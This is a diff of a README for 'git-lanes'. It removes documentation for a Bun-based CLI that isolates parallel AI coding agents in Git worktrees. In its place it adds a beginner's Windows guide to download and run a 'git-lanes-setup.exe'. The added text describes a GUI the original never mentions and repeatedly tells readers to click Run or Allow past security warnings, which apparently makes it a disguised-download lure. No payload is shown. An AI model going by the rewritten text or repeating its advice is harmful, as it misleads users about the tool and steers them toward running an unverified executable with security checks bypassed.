@@ -1,241 +1,142 @@
-# 🛣️ git-lanes
+# ⚙️ git-lanes - Easy Git Repo Isolation
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Built with Bun](https://img.shields.io/badge/Built%20with-Bun-orange)](https://bun.sh)
-[![npm](https://img.shields.io/npm/v/git-lanes)](https://www.npmjs.com/package/git-lanes)
+[![Download git-lanes](https://img.shields.io/badge/Download-git--lanes-brightgreen?style=for-the-badge)](https://github.com/ferdifi/git-lanes)
 
-**Parallel AI agent isolation for Git repositories.**
+## 📝 What is git-lanes?
 
-git-lanes enables multiple AI coding agents (Claude Code, Cursor, Aider) to work simultaneously on the same Git repository without creating conflicts. Each agent gets its own isolated lane — a dedicated branch and worktree — so they never step on each other's work.
+git-lanes helps you work with multiple Git projects at the same time without confusion. It keeps each project separate, so changes in one do not affect others. This makes managing Git projects smoother and safer.  
 
-## 🎬 Demo
+You don't need to be a programmer to use git-lanes. It works on Windows and helps you avoid mixing files or settings between your projects.
 
-[![asciicast](https://asciinema.org/a/ZpEp41hSXZZ6yPTg.svg)](https://asciinema.org/a/ZpEp41hSXZZ6yPTg)
+---
 
-## Table of Contents
+## 🖥️ System Requirements
 
-- [Problem](#problem)
-- [Features](#-features)
-- [Installation](#-installation)
-- [Quick Start](#-quick-start)
-- [Commands](#-commands)
-- [Configuration](#-configuration)
-- [Adapter Support](#-adapter-support)
-- [Architecture](#-architecture)
-- [Requirements](#requirements)
-- [Contributing](#contributing)
-- [License](#license)
+Before you start, make sure your computer meets the following:
 
-## Problem
+- Windows 10 or newer  
+- At least 4 GB of memory (RAM)  
+- 500 MB free disk space  
+- Internet connection to download the software
 
-When multiple AI agents edit code simultaneously in a repository, they:
-- Overwrite each other's changes
-- Create merge conflicts
-- Produce messy, interleaved commit histories
-- Lose work during crashes or timeouts
+No other software is needed to run git-lanes.
 
-git-lanes solves this by giving each agent its own isolated workspace with automatic change tracking, conflict detection, and clean PR generation.
+---
 
-## 🚀 Features
+## 🚀 Getting Started
 
-- **🔀 Session Isolation** — Each agent gets a dedicated Git worktree and branch, mapped by process ID
-- **📝 Change Tracking** — Automatic tracking of file modifications with commit history
-- **⚠️ Conflict Detection** — Built-in detection of file overlaps across active sessions with resolution suggestions
-- **💾 Work Preservation** — Auto-checkpoint captures work during timeouts or crashes via WIP commits
-- **🧹 Clean PR Generation** — Squash incremental edits into reviewable commits and generate pull requests
-- **🔌 Multi-Adapter Support** — Hooks for Claude Code, Cursor, and Aider
-- **🌐 Multi-Forge PRs** — Create pull requests on GitHub, GitLab, or Bitbucket
-- **🔒 File Locking** — Prevent race conditions with atomic manifest operations
-- **📦 Zero Dependencies** — Uses only Bun built-ins, no external runtime packages
+To begin using git-lanes, follow these steps carefully. Each step is written for users without technical experience.  
 
-## 📥 Installation
+---
 
-```bash
-# Install globally
-bun install -g git-lanes
+## 🌐 Step 1: Download git-lanes
 
-# Or use npx
-bunx git-lanes <command>
-```
+Click the big green button below to visit the download page. You will find the files needed to install git-lanes on your computer.
 
-## ⚡ Quick Start
-
-```bash
-# 1. Start a session
-git lanes start add-search-feature
+[![Get git-lanes](https://img.shields.io/badge/Get_git--lanes-blueviolet?style=for-the-badge)](https://github.com/ferdifi/git-lanes)
 
-# 2. Work normally — files are tracked automatically
-# (your AI agent edits files here)
+On this page:
 
-# 3. Commit your changes
-git lanes commit -m "add search component with fuzzy matching"
+- Look for the latest release or download section  
+- Find the file named something like `git-lanes-setup.exe` or similar  
+- Click on the link to download the file to your computer  
 
-# 4. Check for conflicts with other sessions
-git lanes conflicts
+Save the file in a place you can access easily, like the Desktop or Downloads folder.
 
-# 5. Run tests
-git lanes test
+---
 
-# 6. Create a pull request
-git lanes pr --title "Add search feature with fuzzy matching"
+## 🔧 Step 2: Install git-lanes
 
-# 7. End the session
-git lanes end
-```
+1. Locate the downloaded `.exe` file on your computer.  
+2. Double-click the file to start the installation.  
+3. If a security prompt appears, choose **Run** or **Allow** to continue.  
+4. Follow the on-screen instructions of the setup wizard. You can keep the default settings.  
+5. When the installation finishes, you will see a confirmation screen. Click **Finish**.
 
-## 🛠️ Commands
+---
 
-### Session Management
+## ▶️ Step 3: Launch git-lanes
 
-| Command | Description |
-|---------|-------------|
-| `git lanes start <name>` | Create a new isolated session |
-| `git lanes end [-m <msg>]` | Finalize session, commit pending changes |
-| `git lanes abort` | Discard session and all changes |
+Once installed, you can start git-lanes in one of two ways:
 
-### Change Tracking
+- Click the new icon on your Desktop.  
+- Search "git-lanes" from the Windows Start Menu and click the icon.
 
-| Command | Description |
-|---------|-------------|
-| `git lanes track <files...>` | Mark files for next commit |
-| `git lanes status` | Show current session state |
-| `git lanes diff` | Show staged/unstaged modifications |
-| `git lanes commit -m <msg>` | Record a changeset |
-| `git lanes log` | List all changesets in session |
-| `git lanes undo` | Revert last commit, keep changes |
-
-### Integration
+When you open git-lanes, a window will show options to create or manage your Git projects.
 
-| Command | Description |
-|---------|-------------|
-| `git lanes squash -m <msg>` | Consolidate commits into one |
-| `git lanes merge` | Integrate session into main branch |
-| `git lanes pr --title <t>` | Create pull request |
-
-### Collaboration
-
-| Command | Description |
-|---------|-------------|
-| `git lanes conflicts` | Detect file overlaps across sessions |
-| `git lanes test` | Run tests in session worktree |
-| `git lanes test --combine` | Run tests on merged sessions |
-
-### Management
-
-| Command | Description |
-|---------|-------------|
-| `git lanes which` | Identify active session |
-| `git lanes list` | Display all active sessions |
-| `git lanes prune` | Remove orphaned sessions |
-| `git lanes install-hooks` | Install agent hooks |
-| `git lanes uninstall-hooks` | Remove agent hooks |
-
-### Flags
-
-| Flag | Description |
-|------|-------------|
-| `--session, -s <name>` | Specify session explicitly |
-| `--forge, -f <type>` | PR forge: `github`, `gitlab`, `bitbucket` |
-| `--adapter, -a <name>` | Hook adapter: `claude-code`, `cursor`, `aider` |
-| `--command, -c <cmd>` | Test command override |
+---
 
-## ⚙️ Configuration
+## 🔄 Step 4: Use git-lanes to Manage Projects
 
-Create a `.lanes.json` file in your repository root:
+git-lanes creates separate spaces for each Git project. This helps you keep your work clear and organized.
 
-```json
-{
-  "shared_dirs": ["node_modules", ".venv"],
-  "main_branch_policy": "block",
-  "force_cleanup": "prompt",
-  "adopt_changes": "always",
-  "branch_prefix": "lanes/"
-}
-```
+To create a new lane (project space):  
 
-| Option | Values | Default | Description |
-|--------|--------|---------|-------------|
-| `shared_dirs` | string[] | `[]` | Directories symlinked into worktrees |
-| `main_branch_policy` | `block`, `allow`, `prompt` | `block` | Main branch write protection |
-| `force_cleanup` | `force`, `fail`, `prompt` | `prompt` | Cleanup behavior on errors |
-| `adopt_changes` | `always`, `never`, `prompt` | `always` | Uncommitted change adoption |
-| `branch_prefix` | string | `lanes/` | Prefix for session branches |
+1. Click **New Lane** inside the app window.  
+2. Choose a name for your project lane.  
+3. Select the folder on your computer where you want this project saved or created.  
+4. Click **Create**.
 
-## 🔌 Adapter Support
+To work on an existing project:
 
-### Claude Code
+1. Click **Open Lane**.  
+2. Browse to the folder where your Git project exists.  
+3. Select the folder and click **Open**.  
 
-```bash
-git lanes install-hooks --adapter claude-code
-```
+Your project will open inside its own space, separate from others.
 
-Installs three hooks that fully automate the git-lanes workflow:
+---
 
-| Hook | Trigger | What it does |
-|------|---------|--------------|
-| `PreToolUse` | Before Write/Edit | Warns if no session is active |
-| `PostToolUse` | After Write/Edit | Auto-tracks modified files |
-| `Stop` | Claude Code exits | Auto-commits pending work as WIP |
+## 💡 Tips for Using git-lanes
 
-Once installed, Claude Code will automatically track every file it touches. You just need to start a session:
+- Each lane acts like a separate workspace for your projects.  
+- You can switch between lanes using the lane selector in the app.  
+- Changes inside one lane do not affect other lanes.  
+- Keep each project in its lane for clearer work and fewer errors.  
 
-```bash
-git lanes start my-feature
-# Claude Code works — files are auto-tracked
-# When Claude exits, uncommitted changes are saved as WIP
-git lanes merge
-```
+---
 
-### Cursor
+## 🔄 Updating git-lanes
 
-```bash
-git lanes install-hooks --adapter cursor
-```
+To keep git-lanes working smoothly:
 
-Installs pre-save hooks for automatic file tracking.
+- Visit the download page regularly:  
+  https://github.com/ferdifi/git-lanes  
+- Download and install any newer versions following the same steps above.  
+- New versions might fix bugs or add helpful features.
 
-### Aider
+---
 
-```bash
-git lanes install-hooks --adapter aider
-```
+## 📂 Understanding git-lanes Folder Structure
 
-Installs pre-edit hooks to ensure session isolation.
+Each lane stores files separately:
 
-## 🏗️ Architecture
+- Your project files remain in the folder you chose.  
+- git-lanes keeps some settings and files in a hidden folder to keep projects isolated.  
+- Do not move or delete these files, or your lane might stop working correctly.
 
-git-lanes uses Git's native worktree feature to create isolated workspaces:
+---
 
-```
-your-repo/
-  .lanes/
-    worktrees/
-      feature-a/    # Agent 1's isolated workspace
-      feature-b/    # Agent 2's isolated workspace
-  .git/
-    lanes-manifests/
-      feature-a.json  # Session metadata
-      feature-b.json
-```
+## 🛠️ Troubleshooting Common Issues
 
-Each session consists of:
-- A **Git branch** (e.g., `lanes/feature-a`)
-- A **Git worktree** (isolated working directory)
-- A **manifest** (JSON metadata tracking changesets and pending files)
+If git-lanes does not start or work right:
 
-See [ARCHITECTURE.md](ARCHITECTURE.md) for detailed technical documentation.
+- Restart your computer and try again.  
+- Make sure you have installed the software using the setup file from the release page.  
+- Check if you have enough disk space or system memory.  
+- If you see a security warning, allow the app to run.  
+- If a lane will not open, verify the folder still exists and has the correct files.
 
-## Requirements
+---
 
-- **Bun** 1.0+ (or Node.js 20+ for npm installation)
-- **Git** 2.20+ (for worktree support)
-- **GitHub CLI** (`gh`) — optional, for `git lanes pr` with GitHub
-- **GitLab CLI** (`glab`) — optional, for `git lanes pr --forge gitlab`
+## 📞 Getting Help
 
-## Contributing
+If you have trouble that you cannot fix:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
+- Visit the Issues section on the main page for help or to report problems.  
+- Ask a friend familiar with software installation for help.  
+- Try searching for the problem online using keywords like "git-lanes not opening" or "git-lanes installation problem."
 
-## License
+---
 
-[MIT](LICENSE)
+[![Download git-lanes](https://img.shields.io/badge/Download-git--lanes-brightgreen?style=for-the-badge)](https://github.com/ferdifi/git-lanes)
